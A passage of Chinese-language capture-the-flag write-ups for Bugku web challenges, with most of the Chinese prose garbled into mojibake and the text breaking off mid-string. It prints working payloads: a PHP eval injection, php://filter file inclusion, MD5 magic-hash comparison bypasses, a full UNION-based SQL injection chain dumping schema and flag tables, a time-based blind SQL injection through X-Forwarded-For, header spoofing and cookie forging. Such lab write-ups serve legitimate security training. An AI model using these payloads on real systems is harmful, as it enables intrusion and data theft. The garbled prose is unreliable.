æŸ¥çœ‹æºä»£ç ç«Ÿç„¶ç›´æ¥æœ‰flagäº†ï¼Œç½‘ä¸Šçš„è§£æ³•æ˜¯æŠ“åŒ…\næœ¬åœ°åŒ…å« è§£æ³•:åˆ©ç”¨hellowæ„é€ payload $_REQUESTï¼šé»˜è®¤æƒ…å†µä¸‹åŒ…å«äº† $_GETï¼Œ$_POST å’Œ $_COOKIE çš„æ•°ç»„ã€‚ var_dump():æ­¤å‡½æ•°æ˜¾ç¤ºæœ‰å…³åŒ…å«å…¶ç±»å‹å’Œå€¼çš„ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„åŒ–ä¿¡æ¯ã€‚ é€’å½’åœ°æ¢ç´¢æ•°ç»„å’Œå¯¹è±¡ï¼Œå…¶ä¸­å€¼ç¼©è¿›ä»¥æ˜¾ç¤ºç»“æ„ã€‚åœ¨è¿™é¢˜é‡Œé¢åªæ˜¯æ˜¾ç¤ºå˜é‡çš„ç±»å‹ï¼Œå¯¹ evalå¹¶æ— å½±å“ï¼Œå¯¹äºevalæ¥è¯´ï¼Œå’Œevalï¼ˆ$aï¼‰æ˜¯ä¸€æ ·çš„ã€‚\npayloadï¼š/index.php?hello = show_source(\u0026lsquo;flag.php\u0026rsquo;) ç½‘ä¸Šçš„payloadï¼š/index.php?hello=1);show_source(\u0026lsquo;flag.php\u0026rsquo;);var_dump(\nåŸŸåè§£æ ç¼–è¾‘etc/hostsæ·»åŠ ä¸€æ¡123.206.87.240\tflag.bugku.comï¼Œ åœ¨æµè§ˆå™¨ä¸­æ‰“å¼€flag.bugku.comå³å¯å¾—åˆ°flagã€‚\nåæ€ï¼šhostè¯·æ±‚å¤´æ˜¯http1.1æ·»åŠ çš„ä¸œè¥¿ï¼Œ æ·»åŠ åŸŸåè§£æä¹‹åç›´æ¥è®¿é—®123.206.87.240å´æ˜¾ç¤º403ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨httpsä¸‹ä¸»æœºåå¿…ä¸å¯å°‘ã€‚\næ·»åŠ hostä¹‹å‰è®¿é—®ipåœ°å€ç»“æœæ˜¾ç¤ºé”™è¯¯400ï¼ˆç¼ºå°‘hostï¼‰ æ·»åŠ hostä¹‹åè®¿é—®ipåœ°å€ç»“æœæ˜¾ç¤ºé”™è¯¯403ï¼ˆè¯»å–è®¿é—®è¢«ç¦ï¼‰\nä½ å¿…é¡»è®©ä»–åœä¸‹ ä½¿ç”¨burpsuiteçš„repeateråŠŸèƒ½è¿›è¡ŒæŠ“åŒ…æ“ä½œï¼Œ é€šè¿‡å¤šæ¬¡ç‚¹å‡»goï¼Œæœ€ç»ˆå‘ç°åœ¨åŸå…ˆæ˜¯â€œflag is hereâ€çš„ä½ç½®å‡ºç°äº†flag\nå˜é‡1 å‡½æ•°çŸ¥è¯†ï¼š issetï¼ˆï¼‰åˆ¤æ–­æ˜¯å¦æœ‰è¾“å…¥ pre_matchæ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¼•å·ä¸­çš„å†…å®¹éƒ½ä»¥/^å¼€å¤´ï¼Œä»¥$/ç»“å°¾ï¼Œ\\w+çš„æ„æ€æ˜¯09 az A~Zï¼Œ è¾“å…¥çš„å†…å®¹è¢«é™å®šäº†ï¼Œæ‰€ä»¥ä¸èƒ½è¾“å…¥ä»£ç \nè¾“å…¥arg=GLOBALSï¼Œä»ä»£ç ä¸­å¯çŸ¥ä¼šç»™GLOBALSå†å¥—ä¸Šä¸€ä¸ª$ï¼Œå°±è¾“å‡ºäº†flag\nWeb5 æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°jotherç¼–ç ï¼Œæ‰“å¼€æ§åˆ¶å°è¾“å…¥å°±è¡Œäº†\nå¤´ç­‰èˆ± æ‰“å¼€ç½‘é¡µæ˜¾ç¤ºä»€ä¹ˆéƒ½æ²¡æœ‰ï¼ŒæŸ¥çœ‹æºä»£ç ä¹Ÿä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæ‰“å¼€æ§åˆ¶å°é‡æ–°åŠ è½½çœ‹å¤´æ–‡ä»¶ï¼Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œ ç‚¹å‡»æ˜¾ç¤ºå¤´æ–‡ä»¶æºä»£ç ï¼Œæ˜¾ç¤ºflagï¼ˆæ³¨é‡Šå½¢å¼ï¼‰\nç½‘ç«™è¢«é»‘ æ‰«æç«¯å£\nå‘ç°ç™»é™†ç•Œé¢\nç„¶åç”¨burpsuiteçš„intruderåŠŸèƒ½ç ´è§£\nç®¡ç†å‘˜ç³»ç»Ÿ å®åœ¨æ²¡æœ‰å¤´ç»ªï¼Œä¸Šç½‘æŸ¥è¯´è¿™æ˜¯X-Forwarded-For:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œ ä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚ ä¹Ÿå°±æ˜¯ç¬¬ä¸€æ¬¡å‘é€çš„æ—¶å€™ä¼šè®°å½•æœ¬ä¸»æœºçš„ipï¼Œä¹‹åæ¯æ¬¡ç»è¿‡ä¸€ä¸ªä»£ç†ï¼Œ éƒ½ä¼šåœ¨å°¾éƒ¨æ·»åŠ ä¸€ä¸ªä»£ç†çš„ipï¼Œ X-Forwarded-Forå¯ä»¥æ˜¾ç¤ºå®Œæ•´çš„ä¼ è¾“è·¯å¾„å’Œæ¶æ„æ”»å‡»æ¥æºä½†æ˜¯X-Forward-Forå¯ä»¥è¢«ä¼ªé€ ã€‚é¢˜ç›®ä¸­è¯´è”ç³»æœ¬åœ°ç®¡ç†å‘˜ï¼Œé‚£å°±è®¾ç½®X-Forwarded-Forä¸ºä»£è¡¨æœ¬åœ°è®¿é—®çš„127.0.0.1ã€‚ åŒæ—¶æŸ¥çœ‹ç½‘é¡µæºä»£ç å‘ç°ï¼Œæœ‰ä¸€ä¸²æ³¨é‡Šï¼ŒæŸ¥åˆ°è¯´æ˜¯base64ç¼–ç ï¼Œ ç‰¹å¾æ˜¯ç»“å°¾ä»¥ä¸€ä¸ªæˆ–è€…ä¸¤ä¸ª=ç»“æŸï¼Œè§£ç åå¾—åˆ°å¯†ç ï¼Œè¾“å…¥åä½¿ç”¨burpsuiteè¿›è¡Œæ‹¦æˆªï¼Œ æ·»åŠ X-Forwarded-Forï¼š127ã€‚0.0.1åå‘é€ï¼Œå¾—åˆ°äº†flag\nå‚è€ƒèµ„æ–™ï¼šctfä¸­å¸¸è§çš„ç¼–ç æ ¼å¼ï¼š https://www.cnblogs.com/gwind/p/7997922.html\nweb4 æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°ä¸€ä¸²urlç¼–ç çš„ä¸œè¥¿ï¼Œ Evalå‡½æ•°ä¼šå°†é‡Œé¢çš„å†…å®¹ä½œä¸ºä»£ç æ‰§è¡Œï¼Œunescapeå°†å…¶è§£ç ã€‚è¦è§£ç ï¼š\nimport urllib a = \u0026#39;%66%75%6e%63%74%69%6f%6e%20%63%68%65%63%6b%53%75%62%6d%69%74 %28%29%7b%76%61%72%20%61%3d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c %65%6d%65%6e%74%42%79%49%64%28%22%70%61%73%73%77%6f%72%64%22%29% 3b%69%66%28%22%75%6e%64%65%66%69%6e%65%64%22%21%3d%74%79%70 %65%6f%66%20%61%29%7b%69%66%28%22%36%37%64%37%30%39%62%32%62\u0026#39; b = \u0026#39;%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d %3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72 %74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72 %65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45 %6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75 %65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b\u0026#39; print urllib.unquote(a+b) å¾—åˆ°ä»£ç å¦‚ä¸‹ï¼š\nfunction checkSubmit() { var a=document.getElementById(\u0026#34;password\u0026#34;); if(\u0026#34;undefined\u0026#34;!=typeof a) { if(\u0026#34;67d709b2b54aa2aa648cf6e87a7114f1\u0026#34;==a.value)return!0; alert(\u0026#34;Error\u0026#34;); a.focus(); return!1} } document.getElementById(\u0026#34;levelQuest\u0026#34;).onsubmit=checkSubmit; å¯ä»¥çœ‹å‡ºè¿™é‡Œå·²ç»æš´éœ²äº†passwordï¼Œè¿”å›è¾“å…¥å³å¯ã€‚\nflagåœ¨indexé‡Œé¢ ç‚¹å‡»é“¾æ¥ï¼Œçœ‹urlï¼šfile=show.Phpï¼Œå‚æ•°fileæ˜¯å…³é”®ï¼Œ æœ¬åœ°åŒ…å«(include)ï¼šfile=phpï¼š//filter/read=convert.base64-encode/resource=index.php,\næœ‰å…³äºè¿™äº›åè®®çš„å†…å®¹è¦å¥½å¥½çœ‹çœ‹\nè¾“å…¥å¯†ç å¾—åˆ°flag ç”¨burpsuiteç›´æ¥æ‰“\nç‚¹å‡»ä¸€ç™¾ä¸‡æ¬¡ ä½¿ç”¨hackbarä½¿ç”¨poståŠ¨ä½œï¼šclick = 1000001å°±å¾—åˆ°äº†flag\nå¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯ çŸ¥è¯†ç‚¹è¡¥å…… $_SEVRERå‡½æ•°\n\u0026lt;?php $SERVER[\u0026#34;$QUERY_STRING\u0026#34;] //è·å–æŸ¥è¯¢è¯­å¥ä¹Ÿå°±æ˜¯ï¼Ÿä¹‹åçš„å†…å®¹ $SERBER[\u0026#34;REQUEST_URI\u0026#34;] //ç”¨æ¥è·å–URLä¸­çš„è·¯å¾„åœ°å€éƒ¨åˆ†ï¼ˆä¸æ˜¯urlï¼ï¼‰ä¾‹å¦‚ï¼šhttp://www.hujuntao.com/index.php?p=3 //$_SERVER[\u0026#39;REQUEST_URI\u0026#39;]è·å¾—çš„å°±æ˜¯/index.php?p=3è¿™éƒ¨åˆ† $_SERVER[\u0026#34;HTTP_X_REWRITE_URL\u0026#34;] //åœ¨IISä¸‹åŠŸèƒ½åŒä¸Šï¼Œåœ¨apacheç¯å¢ƒä¸‹æ˜¾ç¤ºä¸ºç©º $SERVER[\u0026#34;SCRIPT_NAME\u0026#34;] //è·å–å½“å‰è„šæœ¬çš„è·¯å¾„ï¼Œæ¯”å¦‚â€œ/aaa/index.phpâ€ $_SERVER[\u0026#34;PHP_SELF\u0026#34;] //æ­£åœ¨æ‰§è¡Œçš„è„šæœ¬åï¼Œæ¯”å¦‚â€œ/aaa/index.phpâ€ str function\n\u0026lt;?php strstr($_SERVER[\u0026#39;REQUEST_URI\u0026#39;], \u0026#39;?\u0026#39;) //return the string after \u0026#39;?\u0026#39; (include \u0026#39;?\u0026#39;) substr($str,1) //return the string after the first symbol str_replace(\u0026#39;key\u0026#39;,\u0026#39;\u0026#39;,$str) //replace the \u0026#39;key\u0026#39; in str to \u0026#39;\u0026#39; parse_str($str) //parse the str for example: $str = \u0026#34;first=value\u0026amp;arr[]=foo+bar\u0026amp;arr[]=baz\u0026#34;; // æ¨èç”¨æ³• parse_str($str, $output); echo $output[\u0026#39;first\u0026#39;]; // value echo $output[\u0026#39;arr\u0026#39;][0]; // foo bar echo $output[\u0026#39;arr\u0026#39;][1]; // baz // ä¸å»ºè®®è¿™ä¹ˆç”¨ parse_str($str); echo $first; // value echo $arr[0]; // foo bar echo $arr[1]; // baz å›åˆ°bugkué¢˜ç›®ï¼šå¤‡ä»½æ˜¯ä¸ªå¥½ä¹ æƒ¯\næ‰“å¼€ç•Œé¢å‘ç°åªæœ‰ä¸€ä¸²å­—ç¬¦ä¸² æœç´¢index.php.bakå¯ä»¥çœ‹åˆ°æºç ï¼š\n\u0026lt;?php /** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22 */ include_once \u0026#34;flag.php\u0026#34;; ini_set(\u0026#34;display_errors\u0026#34;, 0); $str = strstr($_SERVER[\u0026#39;REQUEST_URI\u0026#39;], \u0026#39;?\u0026#39;);//get string before \u0026#34;?\u0026#34; $str = substr($str,1); //get string after the second symbol $str = str_replace(\u0026#39;key\u0026#39;,\u0026#39;\u0026#39;,$str); //replace \u0026#39;key\u0026#39; to \u0026#39;\u0026#39; in str parse_str($str); echo md5($key1); echo md5($key2); if(md5($key1) == md5($key2) \u0026amp;\u0026amp; $key1 !== $key2){ echo $flag.\u0026#34;å–å¾—flag\u0026#34;; } ?\u0026gt; ç„¶ååˆ†ææ„é€ payloadï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼Œç”¨MD5åŠ å¯†çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ã€‚\nä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„æ•°å­—ï¼š\nQNKCDZO\n240610708\ns878926199a\ns155964671a\ns214587387a\næ¯”è¾ƒmd5(username),md5(password),md5(code)ç±»å‹å’Œå€¼ï¼ŒåŒç­‰äºå­˜åœ¨æ¼æ´çš„åŸå› å…¶å®æ˜¯ï¼Œ0Eå¼€å¤´çš„MD5å€¼phpè§£æå™¨ä¼šè§£æä¸ºnumerical stringsï¼Œåœ¨åŒç­‰äºï¼ˆ==ï¼‰æƒ…å†µä¸‹ï¼Œä¼šå…ˆåˆ¤æ–­ç±»å‹ï¼Œè¯†åˆ«ä¸ºnumerical stringsï¼Œä¼šå¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—ï¼Œæ‰€ä»¥0eå¼€å¤´çš„MD5å€¼éƒ½ä¸º0ï¼Œæ‰€ä»¥æ‰èƒ½ç»•è¿‡ï¼Œç„¶è€Œä¸‰ç­‰äºå°±æ¯”è¾ƒæœ‰è„¾æ°”äº†ï¼Œå¿…é¡»ä¸€å¯¹ä¸€çš„æ ¸å¯¹ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¸å­˜åœ¨ä»€ä¹ˆç±»å‹è½¬æ¢é—®é¢˜ï¼Œæ‰€ä»¥å¼€å¤´0eç›¸åŒï¼Œåé¢ä¸åŒï¼Œä¹Ÿå°±ä¸æ»¡è¶³äº†\næ‰€ä»¥æ„é€ payloadï¼š\nindex.php?kkey1=QNKCDZO\u0026amp;kkey2=240610708 æŒ‰ä¸‹å›è½¦å°±å¾—åˆ°äº†flag\nå¦ï¼šæœ‰ä¸€ä¸ªæ‰«ææŸ¥çœ‹æºç æ³„éœ²çš„è„šæœ¬ï¼Œä½¿ç”¨æŒ‡å—å’Œä¸‹è½½åœ°å€å¦‚ä¸‹ï¼š https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true\næˆç»©å• åˆ¤æ–­æ˜¯æ•°æ®åº“çš„é—®é¢˜ï¼Œä¸€å¼€å§‹çŠ¯è ¢åœ¨urlæ¡†é‡Œé¢å†™payloadã€‚ã€‚ã€‚ã€‚ æ ¹æ®æ˜¨å¤©æ‰€å­¦çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬å…ˆè¾“å…¥1ï¼Œå¯ä»¥è¾“å‡ºæˆç»©å•ã€‚ç„¶åè¾“å…¥1â€™å‘ç°å¤±è´¥ï¼Œ åœ¨å°¾éƒ¨æ·»åŠ ä¸€ä¸ª#åˆå¯ä»¥æ­£å¸¸æ˜¾ç¤ºäº†ã€‚Emmmmã€‚ã€‚ã€‚ç„¶åç”±äºæˆç»©å•é‡Œé¢æœ‰ä¸‰ä¸ªåˆ—ï¼Œ æ‰€ä»¥ä»3å¼€å§‹è¯•è¯•çœ‹çœ‹åˆ°åº•æœ‰å‡ ä¸ªåˆ—ã€‚ã€‚ã€‚ã€‚ æœ€ç»ˆåœ¨è¾“å…¥-1â€™ union select 1,2,3,4#çš„æ—¶å€™èƒ½å¤Ÿæ˜¾ç¤ºå‡ºå†…å®¹ï¼Œç”±æ­¤ç¡®å®šäº†æœ‰å››åˆ—ã€‚\nè¿™ä¸ªåœ°æ–¹æœ‰ç‚¹è¿·ï¼šåŒæ ·æ˜¯postå½¢å¼ï¼Œ åœ¨æŸ¥è¯¢æ¡†é‡Œé¢è¾“å…¥1â€™#å°±å¯ä»¥ä½†æ˜¯åœ¨hackbaré‡Œé¢å†™id=1â€˜#å°±ä¸è¡Œï¼Œ ç„¶è€Œç”¨id=1ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸æ˜¾ç¤ºçš„ã€‚ã€‚ã€‚è¿™ä¸ªåœ°æ–¹å¾ˆæ˜¯è®©æˆ‘å›°æƒ‘ï¼Œ åæ¥çš„payloadä¹Ÿæ˜¯åœ¨æŸ¥è¯¢æ¡†é‡Œé¢å†™çš„ã€‚ ç¬¬äºŒä¸ªé—®é¢˜æ˜¯ï¼ŒåŒæ ·æ˜¯æ³¨é‡Šï¼Œä¸ºå•¥#å°±å¯ä»¥èµ·ä½œç”¨ä½†æ˜¯\u0026ndash;+å°±ä¸è¡Œï¼Œ è€ƒè™‘åˆ°é¢˜ç›®çš„ç±»å‹ï¼ˆæ°´é¢˜ï¼‰ï¼Œæ„Ÿè§‰ä¸å¤ªå¯èƒ½æ˜¯è¿‡æ»¤æ‰äº†ã€‚ã€‚ã€‚å¾ˆè¿·ã€‚ã€‚ã€‚ã€‚\nå·²è§£å†³ï¼š\u0026ndash;+çš„â€˜+â€™çš„æ„æ€æ˜¯urlä¸­çš„ç©ºæ ¼ï¼ŒçœŸå®çš„æ³¨é‡Šä»…ä»…æ˜¯\u0026ndash;\nåšå®Œè¿™ä¸€åˆ‡åå°±å¯ä»¥å¼€å§‹äº†ï¼š é¦–å…ˆæ˜¯æŸ¥åˆ°æ‰€æœ‰æ•°æ®åº“çš„åå­— -1â€™ union select 1,2,group_concat(schema_name),4 from information_schema.schemata# å¾—åˆ°äº†æ•°æ®åº“åå­—æœ‰ä¸€ä¸ªå«åšskctf_flagçš„ æ¥ä¸‹æ¥ï¼Œé€šè¿‡æ•°æ®åº“åå­—æŸ¥æ‰¾è¡¨å -1â€™ union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=â€™skctf_flagâ€™#\tå¾—åˆ°äº†ä¸€ä¸ªå«åšfl4gçš„ä¸€ä¸ªè¡¨ æ¥ä¸‹æ¥é€šè¿‡è¡¨æ˜æ‰¾åˆ—å -1â€™ union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=â€™fl4gâ€™# å¾—åˆ°äº†ä¸€ä¸ªåˆ—åå­—å«åšskctf_flag æœ€åé€šè¿‡åˆ—åæ‰¾åˆ°å†…å®¹ -1â€™union select 2,3,group_concat(skctf_flag),4 from skctf_flag.fl4g# å¾—åˆ°flag\ncookieæ¬ºéª— çœ‹åˆ°ç½‘å€é‡Œé¢filenameåé¢æ˜¯base64ç¼–ç çš„ä¸œè¥¿ï¼Œå°è¯•è§£ç çœ‹åˆ°æ˜¯keys.txt æ”¹æˆindex.phpè¯•ä¸€è¯•ï¼Œç„¶åè¿™é‡Œæœ‰ä¸€ä¸ªlineå‚æ•°ï¼Œéšä¾¿è¾“ä¸ª1ä»€ä¹ˆçš„ï¼Œå¯ä»¥çœ‹åˆ°æœ‰phpä»£ç è¿”å› ï¼ˆæœ‰ä¸€ä¸ªå›°æƒ‘å°±æ˜¯è¾“å…¥0ä¸è¿”å›æœ€å¼€å§‹çš„\u0026lt;?phpï¼‰ç„¶åæ„é€ ä½ç«¯è„šæœ¬ï¼š\nimport requests #http://123.206.87.240:8002/web11/index.php?line=\u0026amp;filename=aW5kZXgucGhw url1 = \u0026#39;http://123.206.87.240:8002/web11/index.php?line=\u0026#39; url2 = \u0026#39;\u0026amp;filename=aW5kZXgucGhw\u0026#39; for para in range(0,20): url = url1 + repr(para) + url2 print(requests.get(url).content) å¾—åˆ°äº†ä»¥ä¸‹ä»£ç \n\u0026lt;?php error_reporting(0); $file=base64_decode(isset($_GET[\u0026#39;filename\u0026#39;])?$_GET[\u0026#39;filename\u0026#39;]:\u0026#34;\u0026#34;); $line=isset($_GET[\u0026#39;line\u0026#39;])?intval($_GET[\u0026#39;line\u0026#39;]):0;//è¿™é‡Œåº”è¯¥æ˜¯baseè¿›åˆ¶è½¬æ¢ï¼Œlineä¸ºç©ºçš„è¯é»˜è®¤è®¾ç½®ä¸º0 if($file==\u0026#39;\u0026#39;) header(\u0026#34;location:index.php?line=\u0026amp;filename=a2V5cy50eHQ=\u0026#34;); $file_list = array( \u0026#39;0\u0026#39; =\u0026gt;\u0026#39;keys.txt\u0026#39;, \u0026#39;1\u0026#39; =\u0026gt;\u0026#39;index.php\u0026#39;, ); if(isset($_COOKIE[\u0026#39;margin\u0026#39;]) \u0026amp;\u0026amp; $_COOKIE[\u0026#39;margin\u0026#39;]==\u0026#39;margin\u0026#39;){ $file_list[2]=\u0026#39;keys.php\u0026#39;; } if(in_array($file, $file_list)){ $fa = file($file);//åº”è¯¥æ˜¯æ‰“å¼€æ–‡ä»¶çš„æ„æ€ï¼Œæ–‡ä»¶åº”è¯¥æ˜¯åœ¨åŒçº§ç›®å½•ä¸‹ echo $fa[$line]; } ?\u0026gt; ç„¶åè¿™æ˜¯åˆ«äººçš„è·å–ä»£ç è„šæœ¬ï¼š\n#!/usr/bin/env python # -*- coding: utf-8 -*- import requests s=requests.Session() url=\u0026#39;http://120.24.86.145:8002/web11/index.php\u0026#39; for i in range(1,20): payload={\u0026#39;line\u0026#39;:str(i),\u0026#39;filename\u0026#39;:\u0026#39;aW5kZXgucGhw\u0026#39;} a=s.get(url,params=payload).content content=str(a,encoding=\u0026#34;utf-8\u0026#34;) print(content) å—¯äººå®¶çš„æ­£è§„å¾ˆå¤šå•Š\nç„¶åè¿™é‡Œå°±æ˜¯è¦postä¸€ä¸ªcookieï¼Œå…¶ä¸­çš„å‚æ•°æ˜¯margin=margin,è€Œä¸”è¦æŠŠfilenameè®¾ç½®ä¸º keys.phpçš„base64ç¼–ç å½¢å¼ã€‚è¿™ä¸ªå°±åœ¨burpsuiteä¸­æ“ä½œï¼š\nbugku\u0026ndash;insert into the injection point is as follows:\n$sql=\u0026ldquo;insert into client_ip (ip) values (\u0026rsquo;$ip\u0026rsquo;)\u0026rdquo;;\nthe $ip comes from \u0026ldquo;x-forwarded-for\u0026rdquo;\nand before this code, the symbol \u0026lsquo;,\u0026rsquo; has been filtered in our input;\npayload are as followed:\n127.0.0.1+(select case when substr((select flag from flag) from 1 for 1)=\u0026#39;C\u0026#39; then sleep(5) else 0 end)-- + the \u0026lsquo;+\u0026rsquo; on the tail is not for annotation,instead it exists for the blank space before ,because the posted data\u0026rsquo;s last space will be ignored ,but adding another symbol after the space can avoid it.\nnever give up æŸ¥çœ‹æºä»£ç ï¼Œçœ‹è§æ³¨é‡Š\u0026lt;!--1p.html--\u0026gt;\nä¿®æ”¹urlï¼Œè¿›å…¥çš„æ˜¯ctfçš„ä¸»é¡µï¼Œåœ¨viewsourceä¸­ä¿®æ”¹ä»£ç ï¼Œå¾—åˆ°äº†å¦ä¸€ä¸ªç½‘é¡µçš„æºä»£ç ï¼ŒæŸ¥æ‰¾å¾—åˆ° å¯èƒ½æ˜¯é‡å®šå‘ã€‚\n\u0026lt;HTML\u0026gt; \u0026lt;HEAD\u0026gt; \u0026lt;SCRIPT LANGUAGE=\u0026#34;Javascript\u0026#34;\u0026gt; \u0026lt;!-- var Words =\u0026#34;%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A %3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI 3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI 5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5 0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB 1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E\u0026#34; function OutWord() { var NewWords; NewWords = unescape(Words);//unescape()å‡½æ•°å¯å¯¹é€šè¿‡ escape()ç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚ //è¯¥å‡½æ•°çš„å·¥ä½œåŸç†æ˜¯è¿™æ ·çš„ï¼šé€šè¿‡æ‰¾åˆ°å½¢å¼ä¸º %xx å’Œ %uxxxx çš„å­—ç¬¦åºåˆ—ï¼ˆx è¡¨ç¤ºåå…­è¿›åˆ¶çš„æ•°å­—ï¼‰ï¼Œ //ç”¨ Unicode å­—ç¬¦ \\u00xx å’Œ \\uxxxx æ›¿æ¢è¿™æ ·çš„å­—ç¬¦åºåˆ—è¿›è¡Œè§£ç ã€‚ document.write(NewWords); //æŠŠä¸œè¥¿ç›´æ¥å†™é“htmlé¡µé¢é‡Œé¢ } OutWord(); // --\u0026gt; \u0026lt;/SCRIPT\u0026gt; \u0026lt;/HEAD\u0026gt; \u0026lt;BODY\u0026gt; \u0026lt;/BODY\u0026gt; \u0026lt;/HTML\u0026gt; é‚£ä¸ªä¸€å¤§ä¸²çš„ä¸œè¥¿æ˜¯urlç¼–ç çš„ä¸œè¥¿ï¼ˆè§‚å¯Ÿåˆ°å¼€å¤´å’Œç»“å°¾éƒ¨åˆ†å¯èƒ½æ˜¯ä¸€å¯¹æ³¨é‡Šçš„å¤´å°¾ï¼‰ã€‚ åœ¨pythonä¸­è§£ç å¦‚ä¸‹ï¼š\nimport urllib a=\u0026#34;%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI 3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI 5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5 0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU 